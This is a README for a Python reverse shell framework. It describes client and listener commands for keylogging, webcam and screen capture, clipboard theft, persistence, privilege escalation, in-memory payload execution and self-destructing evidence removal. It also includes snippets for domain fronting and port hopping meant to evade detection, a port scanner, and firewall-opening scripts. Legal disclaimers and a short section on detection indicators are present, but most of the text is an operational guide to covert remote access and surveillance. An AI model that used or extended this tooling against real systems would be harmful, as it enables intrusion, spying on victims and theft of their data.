# Advanced Reverse Shell Framework

[![Python Version](https://img.shields.io/badge/python-3.7+-blue.svg)](https://python.org)
[![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey.svg)](https://github.com)
[![License](https://img.shields.io/badge/license-Educational%20Use%20Only-red.svg)](https://github.com)

> **⚠️ LEGAL DISCLAIMER: This tool is for authorized penetration testing, cybersecurity research, and educational purposes only. Never use on systems without explicit written permission. Unauthorized access to computer systems is illegal.**

## 📋 Table of Contents

- [Overview](#overview)
- [Features](#features)
- [Architecture](#architecture)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Detailed Usage](#detailed-usage)
- [Advanced Features](#advanced-features)
- [Security Considerations](#security-considerations)
- [Troubleshooting](#troubleshooting)
- [Development](#development)
- [Contributing](#contributing)
- [Legal & Ethics](#legal--ethics)

## 🎯 Overview

This Advanced Reverse Shell Framework is a comprehensive penetration testing tool designed for cybersecurity professionals, red team operators, and security researchers. It provides a robust, feature-rich reverse shell implementation with advanced capabilities for authorized security assessments.

### What is a Reverse Shell?

A reverse shell is a type of shell where the target machine initiates a connection back to the attacker's machine, allowing remote command execution. Unlike traditional shells where the attacker connects to the target, reverse shells are particularly useful for bypassing firewalls and NAT configurations.

### Key Benefits

- **Firewall Evasion**: Bypasses inbound firewall restrictions
- **NAT Traversal**: Works through Network Address Translation
- **Stealth Operations**: Encrypted communications and obfuscation
- **Multi-Platform**: Cross-platform compatibility (Windows, Linux, macOS)
- **Extensible**: Plugin system for custom functionality

## ✨ Features

### 🔐 Security & Encryption
- **SSL/TLS Encryption**: All communications encrypted with industry-standard protocols
- **Authentication**: Shared secret token authentication
- **Certificate Management**: Automatic SSL certificate generation
- **Data Obfuscation**: Base64 encoding with random delays for evasion

### 🖥️ Multi-Session Management
- **Concurrent Sessions**: Handle multiple target connections simultaneously
- **Session Persistence**: Maintain connections across network interruptions
- **Session Identification**: Unique session IDs with detailed information
- **Interactive Shell**: Full interactive command execution

### 📁 File Operations
- **Secure Transfer**: Encrypted file upload/download capabilities
- **Binary Support**: Handle all file types including executables and media
- **Progress Tracking**: Monitor transfer progress and integrity
- **Path Resolution**: Automatic path handling across platforms

### 🔍 Information Gathering
- **System Enumeration**: Comprehensive system information collection
- **Process Monitoring**: Real-time process listing and analysis
- **Network Discovery**: Network interface and connection enumeration
- **User Context**: Current user and privilege information

### 🎥 Surveillance Capabilities
- **Screen Capture**: Real-time screenshot functionality
- **Webcam Access**: Remote camera capture capabilities
- **Keylogging**: Discrete keystroke monitoring and logging
- **Clipboard Access**: Real-time clipboard content retrieval

### 💾 Persistence Mechanisms
- **Registry Persistence** (Windows): Auto-start via registry keys
- **Crontab Persistence** (Linux): Scheduled execution via cron
- **Service Installation**: System service registration
- **Startup Folder**: User startup directory placement

### 🔧 Advanced Operations
- **Privilege Escalation**: Automated elevation attempts
- **Memory Execution**: In-memory payload execution (Python, PowerShell)
- **Self-Destruct**: Secure cleanup and evidence removal
- **Plugin System**: Extensible architecture for custom modules

## 🏗️ Architecture

### Component Overview

```
┌─────────────────┐         ┌─────────────────┐
│     Listener    │◄───────►│     Client      │
│   (Attacker)    │   SSL   │    (Target)     │
└─────────────────┘         └─────────────────┘
         │                           │
         ▼                           ▼
┌─────────────────┐         ┌─────────────────┐
│  Session Mgmt   │         │   Command Exec  │
│   Logging       │         │   File Transfer │
│   Plugins       │         │   Surveillance   │
└─────────────────┘         └─────────────────┘
```

### Communication Flow

1. **Initial Connection**: Client connects to listener with SSL/TLS
2. **Authentication**: Shared secret token verification
3. **Session Establishment**: Unique session creation and registration
4. **Command Processing**: Base64-encoded command transmission
5. **Response Handling**: Encrypted response with random delays

### Security Layers

| Layer | Component | Purpose |
|-------|-----------|---------|
| Transport | SSL/TLS | Encryption in transit |
| Authentication | Shared Secret | Access control |
| Obfuscation | Base64 + Delays | Evasion techniques |
| Logging | Timestamped Events | Audit trail |

## 🚀 Installation

### Prerequisites

- **Python 3.7+** (Python 3.8+ recommended)
- **pip** package manager
- **OpenSSL** (optional, for manual certificate generation)
- **Administrative privileges** (for some features)

### Automated Setup

#### Windows
```cmd
# Download and run setup script
setup.bat
```

#### Linux/macOS
```bash
# Make setup script executable
chmod +x setup.sh

# Run setup script
./setup.sh
```

### Manual Installation

#### 1. Clone Repository
```bash
git clone <repository-url>
cd reverse-shell-framework
```

#### 2. Create Virtual Environment
```bash
# Create virtual environment
python -m venv venv

# Activate virtual environment
# Windows:
venv\Scripts\activate
# Linux/macOS:
source venv/bin/activate
```

#### 3. Install Dependencies
```bash
# Upgrade pip
pip install --upgrade pip

# Install core dependencies
pip install -r requirements.txt
```

#### 4. Generate SSL Certificates
```bash
# Using OpenSSL
openssl req -x509 -newkey rsa:2048 -keyout server.key -out server.pem -days 365 -nodes

# Or let Python generate them automatically
```

## 🌐 Network Configuration & IP Setup

### Understanding Network Scenarios

Before starting the reverse shell, you need to understand your network topology and configure IP addresses correctly. Here are the common scenarios:

#### Scenario 1: Same Local Network (LAN)
Both attacker and target are on the same network (e.g., home/office network).

```
Router: 192.168.1.1
├── Attacker: 192.168.1.50
└── Target: 192.168.1.100
```

#### Scenario 2: Different Networks (WAN)
Attacker and target are on different networks, requiring port forwarding or public IP.

```
Internet
├── Attacker (Public IP: 203.0.113.50)
└── Target (Behind NAT: 192.168.1.100)
```

#### Scenario 3: Virtual Machine Testing
Using VMs for isolated testing environment.

```
Host Machine: 192.168.1.50
├── VM1 (Attacker): 192.168.56.10
└── VM2 (Target): 192.168.56.20
```

### Step-by-Step IP Configuration

#### 1. Find Your IP Addresses

**Windows:**
```cmd
# Get local IP address
ipconfig

# Get public IP address
curl ifconfig.me
# or
nslookup myip.opendns.com resolver1.opendns.com

# Get all network interfaces
ipconfig /all
```

**Linux/macOS:**
```bash
# Get local IP address
ip addr show
# or
ifconfig

# Get public IP address
curl ifconfig.me
# or
wget -qO- ifconfig.me

# Get default gateway
ip route | grep default
```

#### 2. Network Interface Selection

**Identify the correct network interface:**

```bash
# Windows - List network adapters
netsh interface show interface

# Linux - List network interfaces
ip link show

# Find interface with internet access
# Windows:
route print
# Linux:
ip route
```

**Common Interface Names:**
- **Ethernet**: `eth0`, `ens33`, `Ethernet`
- **Wi-Fi**: `wlan0`, `wlp2s0`, `Wi-Fi`
- **VirtualBox**: `vboxnet0`, `VirtualBox Host-Only`
- **VMware**: `vmnet1`, `VMware Network Adapter`

#### 3. Configure Listener IP Address

The listener IP determines which network interfaces accept connections:

| Listener IP | Description | Use Case |
|-------------|-------------|----------|
| `0.0.0.0` | All interfaces | Recommended for most cases |
| `127.0.0.1` | Localhost only | Local testing only |
| `192.168.1.50` | Specific interface | LAN-specific binding |
| `<public_ip>` | Public interface | Internet-facing (dangerous) |

**Recommended Configuration:**
```bash
# Best practice - listen on all interfaces
python reverse_shell_listener_multi.py 0.0.0.0 4444
```

### Network Scenario Examples

#### Scenario A: Local Network Testing

**Setup:**
```
Network: 192.168.1.0/24
Attacker: 192.168.1.50
Target: 192.168.1.100
```

**Commands:**
```bash
# On Attacker (192.168.1.50)
python reverse_shell_listener_multi.py 0.0.0.0 4444

# On Target (192.168.1.100)
python reverse_shell_client.py 192.168.1.50 4444
```

#### Scenario B: Virtual Machine Lab

**VirtualBox Host-Only Network:**
```
Host: 192.168.56.1
Attacker VM: 192.168.56.10
Target VM: 192.168.56.20
```

**Setup Steps:**
1. **Configure VirtualBox Network:**
   ```
   VirtualBox > File > Host Network Manager
   Create network: 192.168.56.0/24
   ```

2. **VM Network Settings:**
   ```
   VM Settings > Network > Adapter 1
   Attached to: Host-only Adapter
   Name: VirtualBox Host-Only Ethernet Adapter
   ```

3. **Run Commands:**
   ```bash
   # Attacker VM (192.168.56.10)
   python reverse_shell_listener_multi.py 0.0.0.0 4444
   
   # Target VM (192.168.56.20)
   python reverse_shell_client.py 192.168.56.10 4444
   ```

#### Scenario C: Internet Connection (Advanced)

**⚠️ WARNING: Only use with proper authorization and VPN protection**

**With Public IP (Dangerous):**
```bash
# If you have a public static IP
python reverse_shell_listener_multi.py 0.0.0.0 4444

# Client connects to your public IP
python reverse_shell_client.py <your_public_ip> 4444
```

**With Port Forwarding:**
```bash
# Configure router port forwarding: External 4444 -> Internal 192.168.1.50:4444
# Listener on internal machine
python reverse_shell_listener_multi.py 0.0.0.0 4444

# Client connects to public IP
python reverse_shell_client.py <router_public_ip> 4444
```

### Firewall Configuration

#### Windows Firewall

**Allow Python through firewall:**
```cmd
# Add firewall rule for Python
netsh advfirewall firewall add rule name="Python Reverse Shell" dir=in action=allow program="C:\Python39\python.exe"

# Or allow specific port
netsh advfirewall firewall add rule name="Port 4444" dir=in action=allow protocol=TCP localport=4444

# Check firewall status
netsh advfirewall show allprofiles
```

**PowerShell method:**
```powershell
# Add firewall rule
New-NetFirewallRule -DisplayName "Python Reverse Shell" -Direction Inbound -Protocol TCP -LocalPort 4444 -Action Allow

# Remove rule later
Remove-NetFirewallRule -DisplayName "Python Reverse Shell"
```

#### Linux Firewall (UFW/iptables)

**Using UFW:**
```bash
# Check UFW status
sudo ufw status

# Allow specific port
sudo ufw allow 4444/tcp

# Allow from specific IP
sudo ufw allow from 192.168.1.100 to any port 4444

# Remove rule
sudo ufw delete allow 4444/tcp
```

**Using iptables:**
```bash
# Allow incoming connections on port 4444
sudo iptables -A INPUT -p tcp --dport 4444 -j ACCEPT

# Allow from specific IP only
sudo iptables -A INPUT -p tcp -s 192.168.1.100 --dport 4444 -j ACCEPT

# Save rules (Ubuntu/Debian)
sudo iptables-save > /etc/iptables/rules.v4
```

### Port Selection Guidelines

#### Common Port Choices

| Port Range | Type | Examples | Notes |
|------------|------|----------|-------|
| 1-1023 | Well-known | 80, 443, 22 | May require admin privileges |
| 1024-49151 | Registered | 4444, 8080, 9999 | Good for testing |
| 49152-65535 | Dynamic | 50000, 60000 | Less likely to conflict |

#### Recommended Ports for Testing

```bash
# Common reverse shell ports
4444    # Most common, may be monitored
4445    # Alternative
8080    # HTTP-like, less suspicious
8443    # HTTPS-like
9999    # Common alternative
31337   # Leet speak, obvious to security
```

#### Stealth Port Selection

**Blend in with legitimate traffic:**
```bash
# Use common service ports
80      # HTTP (requires admin on Linux)
443     # HTTPS (requires admin on Linux)
53      # DNS
123     # NTP
```

**Check port availability:**
```bash
# Windows
netstat -an | findstr :4444

# Linux
netstat -tlnp | grep :4444
ss -tlnp | grep :4444
```

## 🚀 Quick Start

### Basic Usage Example

#### 1. Network Discovery
```bash
# Find your network configuration
# Windows:
ipconfig
netstat -rn

# Linux:
ip addr show
ip route show

# Identify:
# - Your IP address (e.g., 192.168.1.50)
# - Target IP address (e.g., 192.168.1.100)
# - Network range (e.g., 192.168.1.0/24)
```

#### 2. Start the Listener (Attacker Machine)
```bash
# Listen on all interfaces (recommended)
python reverse_shell_listener_multi.py 0.0.0.0 4444

# Or listen on specific interface
python reverse_shell_listener_multi.py 192.168.1.50 4444
```

#### 3. Connect Client (Target Machine)
```bash
# Connect to attacker's IP
python reverse_shell_client.py 192.168.1.50 4444

# Test connection first
python test_connection.py 192.168.1.50 4444
```

#### 4. Interact with Session
```
MultiShell> list
ID  Address           Status   Info
--  ----------------  -------  ----
1   192.168.1.100:50123  active   Windows

MultiShell> select 1
[+] Interacting with Session 1 (192.168.1.100:50123)

Session 1> sysinfo
{
  "hostname": "TARGET-PC",
  "platform": "Windows-10-10.0.19041-SP0",
  "os": "nt",
  "architecture": "AMD64",
  "user": "john.doe"
}

Session 1> screenshot screenshot.png
[+] Screenshot saved to screenshot.png (245680 bytes)
```

### Network Testing and Validation

#### Connection Testing Script

Create `network_test.py`:
```python
#!/usr/bin/env python3
import socket
import subprocess
import platform

def test_network_connectivity():
    """Test network connectivity and configuration"""
    
    print("=== Network Configuration Test ===")
    
    # Get local IP
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    print(f"Hostname: {hostname}")
    print(f"Local IP: {local_ip}")
    
    # Test internet connectivity
    try:
        socket.create_connection(("8.8.8.8", 53), timeout=3)
        print("✓ Internet connectivity: OK")
    except:
        print("✗ Internet connectivity: FAILED")
    
    # Show network interfaces
    if platform.system() == "Windows":
        subprocess.run(["ipconfig"])
    else:
        subprocess.run(["ip", "addr", "show"])

if __name__ == "__main__":
    test_network_connectivity()
```

#### Port Scanner for Target Discovery

Create `port_scanner.py`:
```python
#!/usr/bin/env python3
import socket
import threading
from concurrent.futures import ThreadPoolExecutor

def scan_port(host, port, timeout=1):
    """Scan a single port"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((host, port))
        sock.close()
        return port if result == 0 else None
    except:
        return None

def scan_range(host, start_port=1, end_port=1000):
    """Scan range of ports"""
    print(f"Scanning {host}:{start_port}-{end_port}")
    open_ports = []
    
    with ThreadPoolExecutor(max_workers=100) as executor:
        futures = {executor.submit(scan_port, host, port): port 
                   for port in range(start_port, end_port + 1)}
        
        for future in futures:
            result = future.result()
            if result:
                open_ports.append(result)
                print(f"Port {result} is open")
    
    return open_ports

if __name__ == "__main__":
    target = input("Enter target IP: ")
    scan_range(target, 1, 1000)
```

### Advanced Network Configurations

#### Dynamic DNS and Remote Access

**For remote testing with dynamic IPs:**

1. **Setup Dynamic DNS (DDNS):**
   ```bash
   # Popular DDNS services:
   # - No-IP (noip.com)
   # - DuckDNS (duckdns.org)
   # - Dynu (dynu.com)
   
   # Example with DuckDNS
   echo url="https://www.duckdns.org/update?domains=yourdomain&token=your-token&ip=" | curl -k -o ~/duckdns/duck.log -K -
   ```

2. **Configure listener with DDNS:**
   ```bash
   # Use domain instead of IP
   python reverse_shell_client.py yourdomain.duckdns.org 4444
   ```

#### VPN and Tunneling

**Using VPN for secure remote testing:**

```bash
# With OpenVPN
sudo openvpn --config client.ovpn

# Find VPN interface IP
ip addr show tun0

# Use VPN IP for listener
python reverse_shell_listener_multi.py 10.8.0.1 4444
```

#### Docker Network Testing

**Containerized testing environment:**

```dockerfile
# Dockerfile for isolated testing
FROM python:3.9-slim

WORKDIR /app
COPY . .
RUN pip install -r requirements.txt

EXPOSE 4444
CMD ["python", "reverse_shell_listener_multi.py", "0.0.0.0", "4444"]
```

```bash
# Build and run
docker build -t reverse-shell .
docker run -p 4444:4444 reverse-shell

# Get container IP
docker inspect <container_id> | grep IPAddress
```

### Network Security Considerations

#### Traffic Analysis Evasion

**Port hopping technique:**
```python
# Port hopping client modification
import random

ports = [80, 443, 8080, 8443, 9999]
for port in ports:
    try:
        connect_to_listener(attacker_ip, port)
        break
    except:
        continue
```

**Domain fronting (Advanced):**
```python
# Use CDN domains for obfuscation
cdn_domains = [
    "amazonaws.com",
    "cloudflare.com", 
    "azure.com"
]

# HTTP requests through legitimate domains
headers = {"Host": "real-c2-domain.com"}
requests.get(f"https://{random.choice(cdn_domains)}", headers=headers)
```

#### Network Monitoring Detection

**Signs that may trigger detection:**
```bash
# Unusual outbound connections
netstat -an | grep ESTABLISHED

# DNS queries to suspicious domains
# Monitor: /var/log/dns.log (Linux)

# Certificate anomalies
# Self-signed certificates may be flagged

# Traffic patterns
# Regular beacon intervals
# Base64 encoded data streams
```

### Troubleshooting Network Issues

#### Common Connection Problems

**Problem 1: Connection Refused**
```bash
# Diagnostic steps:
1. Check listener is running:
   netstat -tlnp | grep 4444

2. Test local connection:
   telnet 127.0.0.1 4444

3. Check firewall:
   # Windows:
   netsh advfirewall show allprofiles
   # Linux:
   sudo ufw status

4. Verify IP address:
   ping <attacker_ip>
```

**Problem 2: Connection Timeout**
```bash
# Possible causes:
1. Incorrect IP address
2. Network routing issues
3. Firewall blocking
4. NAT/Port forwarding misconfiguration

# Solutions:
# Check routing table:
route print (Windows)
ip route show (Linux)

# Trace route to target:
tracert <target_ip> (Windows)
traceroute <target_ip> (Linux)
```

**Problem 3: SSL Handshake Failures**
```bash
# Certificate issues:
1. Regenerate certificates:
   openssl req -x509 -newkey rsa:2048 -keyout server.key -out server.pem -days 365 -nodes

2. Check certificate validity:
   openssl x509 -in server.pem -text -noout

3. Test SSL connection:
   openssl s_client -connect <listener_ip>:4444
```

#### Network Debugging Tools

**Packet Capture and Analysis:**
```bash
# Wireshark GUI analysis
wireshark

# Command-line packet capture
# Windows:
netsh trace start capture=yes tracefile=capture.etl

# Linux:
sudo tcpdump -i any -w capture.pcap port 4444

# Analyze SSL traffic:
tshark -r capture.pcap -Y "ssl"
```

**Network Discovery:**
```bash
# Discover live hosts
nmap -sn 192.168.1.0/24

# Port scan
nmap -sS -p 1-1000 192.168.1.100

# Service detection
nmap -sV -p 4444 192.168.1.100
```

### Network Configuration Scripts

#### Automated Network Setup

Create `network_setup.py`:
```python
#!/usr/bin/env python3
"""
Automated network configuration for reverse shell testing
"""
import subprocess
import socket
import platform
import ipaddress

def get_network_info():
    """Get current network configuration"""
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    
    # Get network interface info
    if platform.system() == "Windows":
        result = subprocess.run(["ipconfig"], capture_output=True, text=True)
    else:
        result = subprocess.run(["ip", "addr", "show"], capture_output=True, text=True)
    
    return {
        "hostname": hostname,
        "local_ip": local_ip,
        "interface_info": result.stdout
    }

def find_network_range(ip):
    """Find network range for given IP"""
    try:
        # Assume /24 network
        network = ipaddress.IPv4Network(f"{ip}/24", strict=False)
        return str(network)
    except:
        return None

def test_connectivity(target_ip, port=4444):
    """Test if target port is reachable"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        result = sock.connect_ex((target_ip, port))
        sock.close()
        return result == 0
    except:
        return False

def configure_firewall(port=4444):
    """Configure firewall for reverse shell"""
    if platform.system() == "Windows":
        # Windows firewall rule
        cmd = f'netsh advfirewall firewall add rule name="Reverse Shell {port}" dir=in action=allow protocol=TCP localport={port}'
        subprocess.run(cmd, shell=True)
        print(f"[+] Windows firewall configured for port {port}")
    else:
        # Linux UFW rule
        cmd = f"sudo ufw allow {port}/tcp"
        subprocess.run(cmd, shell=True)
        print(f"[+] Linux firewall configured for port {port}")

def main():
    """Main network setup function"""
    print("=== Reverse Shell Network Setup ===")
    
    # Get network info
    info = get_network_info()
    print(f"Hostname: {info['hostname']}")
    print(f"Local IP: {info['local_ip']}")
    
    # Find network range
    network_range = find_network_range(info['local_ip'])
    if network_range:
        print(f"Network Range: {network_range}")
    
    # Configure firewall
    port = int(input("Enter port to use (default 4444): ") or "4444")
    configure_firewall(port)
    
    # Test setup
    print(f"\nRecommended commands:")
    print(f"Listener: python reverse_shell_listener_multi.py 0.0.0.0 {port}")
    print(f"Client: python reverse_shell_client.py {info['local_ip']} {port}")

if __name__ == "__main__":
    main()
```

#### Network Monitoring Script

Create `network_monitor.py`:
```python
#!/usr/bin/env python3
"""
Monitor network connections for reverse shell activity
"""
import psutil
import time
import json
from datetime import datetime

def monitor_connections(port=4444, duration=60):
    """Monitor network connections on specified port"""
    print(f"Monitoring connections on port {port} for {duration} seconds...")
    
    start_time = time.time()
    connections = []
    
    while time.time() - start_time < duration:
        for conn in psutil.net_connections(kind='inet'):
            if conn.laddr.port == port or (conn.raddr and conn.raddr.port == port):
                connection_info = {
                    "timestamp": datetime.now().isoformat(),
                    "local_addr": f"{conn.laddr.ip}:{conn.laddr.port}",
                    "remote_addr": f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else "N/A",
                    "status": conn.status,
                    "pid": conn.pid
                }
                
                if connection_info not in connections:
                    connections.append(connection_info)
                    print(f"[{connection_info['timestamp']}] New connection: {connection_info}")
        
        time.sleep(1)
    
    # Save results
    with open(f"network_monitor_{int(time.time())}.json", "w") as f:
        json.dump(connections, f, indent=2)
    
    print(f"Monitoring complete. Found {len(connections)} connections.")

if __name__ == "__main__":
    port = int(input("Enter port to monitor (default 4444): ") or "4444")
    duration = int(input("Enter monitoring duration in seconds (default 60): ") or "60")
    monitor_connections(port, duration)
```

### Listener Commands

| Command | Description | Example |
|---------|-------------|---------|
| `list` | Show active sessions | `list` |
| `select <id>` | Interact with session | `select 1` |
| `help` | Show help information | `help` |
| `exit` | Exit the listener | `exit` |

### Session Commands

#### System Information
```bash
# Get comprehensive system information
sysinfo

# List running processes
ps

# Get current user and privileges
whoami
```

#### File Operations
```bash
# Upload file to target
upload /local/path/file.txt C:\temp\file.txt

# Download file from target
download C:\temp\data.txt ./downloaded_data.txt

# List directory contents
ls C:\Users\Public
```

#### Surveillance
```bash
# Take screenshot
screenshot ./evidence/screenshot_001.png

# Start keylogger
keylog_start

# Stop keylogger
keylog_stop

# Download keylog file
keylog_dump ./evidence/keylog.txt

# Get clipboard contents
clipboard
```

#### Persistence & Control
```bash
# Add persistence mechanism
persist

# Check current persistence status
persist_status

# Elevate privileges (Windows: UAC, Linux: sudo)
elevate

# Clean up and exit
selfdestruct
```

### Advanced Commands

#### Memory Execution
```bash
# Execute Python code in memory
execmem python <base64_encoded_python_code>

# Execute PowerShell script (Windows)
execmem powershell <base64_encoded_ps1_script>
```

#### Network Operations
```bash
# Network information gathering
netinfo

# Current network connections
netstat

# Network discovery
lateral_move scan
```

## 🔬 Advanced Features

### Plugin System

The framework includes an extensible plugin system for custom functionality.

#### Creating a Plugin

1. **Create Plugin File**: `plugins/my_plugin.py`
```python
#!/usr/bin/env python3
"""
Custom plugin for specific functionality
"""

def run(args):
    """
    Main plugin function
    Args: arguments passed from listener
    Returns: result string
    """
    # Your custom code here
    return f"Plugin executed with args: {args}"
```

2. **Load and Execute Plugin**
```bash
# List available plugins
list_plugins

# Load plugin
load_plugin my_plugin

# Execute plugin
run_plugin my_plugin "test arguments"
```

### Obfuscation Techniques

The framework implements several evasion techniques:

- **Base64 Encoding**: All command/response data encoded
- **Random Delays**: Variable timing to avoid pattern detection
- **SSL/TLS Encryption**: Encrypted transport layer
- **Certificate Validation Bypass**: For testing environments

### Logging and Forensics

#### Client-Side Logging
```
[2024-01-15T10:30:45] Connected to 192.168.1.50:4444
[2024-01-15T10:30:46] Command received: sysinfo
[2024-01-15T10:30:46] Output sent: {"hostname": "target", ...}
```

#### Server-Side Logging
```
[2024-01-15T10:30:45] Connection attempt from 192.168.1.100:50123
[2024-01-15T10:30:45] Authenticated connection (Session 1)
[2024-01-15T10:30:46] Command sent to Session 1: sysinfo
```

### Multi-Platform Considerations

#### Windows-Specific Features
- Registry persistence mechanisms
- Windows Credential Manager access
- PowerShell in-memory execution
- UAC bypass attempts
- Windows service installation

#### Linux-Specific Features
- Crontab persistence
- Systemd service installation
- PTY upgrade for interactive shells
- Sudo privilege escalation
- Package manager integration

#### macOS-Specific Features
- LaunchAgent persistence
- Keychain access (planned)
- macOS-specific enumeration

## 🔒 Security Considerations

### Defensive Measures

This tool helps test the following security controls:

#### Network Security
- **Firewall Rules**: Test outbound connection filtering
- **IDS/IPS Detection**: Encrypted traffic analysis
- **Network Monitoring**: Unusual traffic pattern detection
- **SSL Inspection**: Deep packet inspection capabilities

#### Endpoint Security
- **Antivirus Evasion**: Test signature-based detection
- **Behavioral Analysis**: Monitor process execution patterns
- **Application Whitelisting**: Test execution restrictions
- **Privilege Escalation**: Validate access controls

#### Detection Indicators

Security teams should monitor for:

```bash
# Network indicators
- Outbound SSL connections to unusual ports
- Base64 encoded traffic patterns
- Persistent connections to external IPs
- Certificate anomalies

# Host indicators
- Unusual process execution
- Registry/crontab modifications
- Temporary file creation
- Memory injection techniques
```

### OPSEC Considerations

When using this tool for authorized testing:

1. **Network Traffic**: SSL encryption helps avoid detection
2. **File System**: Minimal disk footprint, logs can be cleaned
3. **Process Behavior**: Python processes may be monitored
4. **Registry/Cron**: Persistence mechanisms create artifacts
5. **Memory Usage**: In-memory execution reduces disk artifacts

## 🛠️ Troubleshooting

### Common Issues

#### Connection Problems

**Issue**: `Connection refused`
```bash
# Check if listener is running
netstat -tlnp | grep 4444

# Verify firewall settings
# Windows:
netsh advfirewall firewall show rule name="Python"
# Linux:
sudo ufw status
```

**Issue**: `SSL Certificate Error`
```bash
# Regenerate certificates
openssl req -x509 -newkey rsa:2048 -keyout server.key -out server.pem -days 365 -nodes

# Or delete existing certs to auto-generate
rm server.pem server.key
```

#### Module Import Errors

**Issue**: `ModuleNotFoundError`
```bash
# Install missing dependencies
pip install -r requirements.txt

# For specific modules:
pip install cryptography pyautogui pyperclip
```

#### Permission Issues

**Issue**: `Permission denied`
```bash
# Windows: Run as Administrator
# Linux: Use sudo for system-level operations
sudo python reverse_shell_listener_multi.py 0.0.0.0 443
```

### Debug Mode

Enable verbose logging for troubleshooting:

```python
# Add to beginning of script
import logging
logging.basicConfig(level=logging.DEBUG)
```

### Platform-Specific Issues

#### Windows
- **Antivirus**: May flag as malicious, add exception
- **Windows Defender**: Real-time protection interference
- **UAC**: Elevation prompts for certain features
- **PowerShell Execution Policy**: May prevent script execution

#### Linux
- **SELinux/AppArmor**: Security policies may block execution
- **Firewall**: iptables/ufw rules may block connections
- **Python Version**: Ensure Python 3.7+ compatibility
- **Dependencies**: Some packages require build tools

## 👥 Development

### Project Structure

```
reverse-shell-framework/
├── reverse_shell_client.py          # Main client implementation
├── reverse_shell_listener_multi.py  # Multi-session listener
├── plugins/                         # Plugin directory
│   ├── example.py                   # Example plugin
│   └── sysinfo.py                   # System info plugin
├── requirements.txt                 # Python dependencies
├── setup.bat                        # Windows setup script
├── setup.sh                         # Unix setup script
├── test_connection.py               # Connection testing utility
├── server.pem                       # SSL certificate (generated)
├── server.key                       # SSL private key (generated)
└── README.md                        # This file
```

### Adding New Features

#### Client-Side Features

1. **Add Command Handler**:
```python
elif decoded.startswith('new_command '):
    try:
        # Implementation here
        result = handle_new_command(decoded)
        resp = safe_encode(result)
        ssl_sock.send(resp)
    except Exception as e:
        resp = safe_encode(f'[!] Error: {e}')
        ssl_sock.send(resp)
```

2. **Test Implementation**:
```bash
# Test new command
Session 1> new_command test_args
```

#### Listener-Side Features

1. **Add Command Parsing**:
```python
elif shell_cmd.startswith('new_command '):
    selected_session.send(shell_cmd)
    response = selected_session.get_response()
    print(response)
```

### Code Style Guidelines

- **PEP 8**: Follow Python style guidelines
- **Error Handling**: Comprehensive try/catch blocks
- **Logging**: Include detailed logging for debugging
- **Comments**: Document complex functionality
- **Security**: Always validate input and handle edge cases

### Testing

#### Unit Testing
```bash
# Run basic connection test
python test_connection.py 127.0.0.1 4444

# Test SSL functionality
python -c "import ssl; print('SSL support:', ssl.OPENSSL_VERSION)"
```

#### Integration Testing
```bash
# Test full workflow
1. Start listener
2. Connect client
3. Execute commands
4. Verify functionality
```

## 🤝 Contributing

We welcome contributions from the cybersecurity community!

### How to Contribute

1. **Fork the Repository**
2. **Create Feature Branch**: `git checkout -b feature/new-feature`
3. **Commit Changes**: `git commit -am 'Add new feature'`
4. **Push to Branch**: `git push origin feature/new-feature`
5. **Create Pull Request**

### Contribution Guidelines

- **Security First**: All contributions must maintain security standards
- **Documentation**: Include comprehensive documentation
- **Testing**: Test on multiple platforms
- **Legal Compliance**: Ensure all code is for legitimate use only

### Areas for Contribution

- **New Plugins**: Additional functionality modules
- **Platform Support**: Enhanced cross-platform compatibility
- **Evasion Techniques**: Advanced anti-detection methods
- **Documentation**: Improved guides and examples
- **Testing**: Automated testing frameworks

## ⚖️ Legal & Ethics

### Legal Disclaimer

This software is provided for educational and authorized testing purposes only. Users are solely responsible for complying with all applicable laws and regulations. The authors and contributors:

- **Do not authorize** illegal or unauthorized use
- **Are not responsible** for misuse of this software
- **Strongly encourage** responsible disclosure and ethical hacking practices

### Authorized Use Cases

✅ **Permitted Uses**:
- Authorized penetration testing
- Red team exercises with proper authorization
- Cybersecurity research and education
- Security control validation
- Training and skill development

❌ **Prohibited Uses**:
- Unauthorized access to computer systems
- Malicious attacks or data theft
- Privacy violations
- Any illegal activities
- Use without explicit written permission

### Responsible Disclosure

If you discover vulnerabilities using this tool:

1. **Report to System Owner**: Notify the organization immediately
2. **Document Findings**: Provide detailed technical information
3. **Suggest Remediation**: Offer solutions and improvements
4. **Follow Timeline**: Respect disclosure timelines
5. **Maintain Confidentiality**: Protect sensitive information

### Ethical Guidelines

- **Permission First**: Always obtain written authorization
- **Minimize Impact**: Avoid disrupting normal operations
- **Protect Data**: Never access or exfiltrate sensitive information
- **Report Responsibly**: Follow responsible disclosure practices
- **Continuous Learning**: Stay updated on legal and ethical standards

---

## 📞 Support

For questions, issues, or contributions:

- **Documentation**: Check this README and USAGE.md
- **Issues**: Create GitHub issues for bugs
- **Discussions**: Use GitHub discussions for questions
- **Security**: Report security issues privately

---

**Remember**: With great power comes great responsibility. Use this tool ethically and legally!

---

*Last updated: January 2024*

---

## 🆕 Recent Improvements (2024)

### Step-by-Step Feature Updates

1. **Automatic System Info Reporting**
   - The client now sends detailed system information (OS, user, hostname, etc.) to the listener immediately after connecting.
   - The listener displays this info in the session list for easier management.

2. **Improved Error Handling & Transparency**
   - All exceptions and errors are now logged to the client log file.
   - If a feature is unavailable due to a missing dependency (e.g., keylogger, screenshot, clipboard, persistence), the client notifies the listener with a clear error message.

3. **Pre-shared Token**
   - The authentication token used for all connections is:
     
     **`SuperSecretToken123`**
   - This must match on both client and listener for a successful connection.

4. **Dependency Documentation**
   - See the new table below for required and optional Python modules for each feature.

---

## 📦 Python Dependencies

| Feature                | Required Module(s)         | Install Command                                  |
|------------------------|----------------------------|--------------------------------------------------|
| Core Reverse Shell     | `socket`, `ssl`, `threading`, `os`, `base64`, `json`, `subprocess`, `platform` | (Standard Library)                               |
| SSL Certificate Gen    | `cryptography` (optional)  | `pip install cryptography`                       |
| Keylogger              | `pynput`                   | `pip install pynput`                             |
| Screenshot             | `pyautogui`                | `pip install pyautogui`                          |
| Clipboard Access       | `pyperclip`                | `pip install pyperclip`                          |
